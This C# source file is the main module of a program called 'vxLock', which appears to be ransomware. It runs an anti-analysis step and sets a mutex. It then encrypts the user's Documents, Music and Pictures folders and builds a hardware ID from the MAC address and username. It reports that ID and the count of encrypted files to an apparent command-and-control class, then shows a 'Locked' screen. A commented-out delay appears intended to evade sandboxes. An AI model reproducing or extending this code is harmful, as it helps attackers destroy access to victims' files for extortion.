using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace vxLock
{
    class vxMain
    {
        

        [STAThread]
        static void Main()
        {
            //System.Threading.Thread.Sleep(120 * 1000);//Sleep for 2 mins
            Prepare();
            Run();
        }

        private static void Run()
        {
            vxFileManager filemgr = new vxFileManager();

            try
            {
                //filemgr.encryptDirectory(Environment.CurrentDirectory);
                filemgr.encryptDirectory(@Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
                filemgr.encryptDirectory(@Environment.GetFolderPath(Environment.SpecialFolder.MyMusic));
                filemgr.encryptDirectory(@Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
            }
            catch(Exception ex) {
                  //System.IO.File.AppendAllText("log.txt", ex.Message);
            }


            String hwid = vxFunctions.GetMD5Hash("AWQWyDQWthrfa" + vxFunctions.GetMACAddress1() + Environment.UserName);
            vxCC cc = new vxCC(hwid, filemgr.GetEncryptedCount());

            

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Locked());


        }

        private static void Prepare()
        { 
            vxAnti Anti = new vxAnti();
            vxMutex Mutex = new vxMutex(true, vxFunctions.GetMD5Hash("AWQWyDQWthrfa" + vxFunctions.GetMACAddress1()));
        }
    }
}
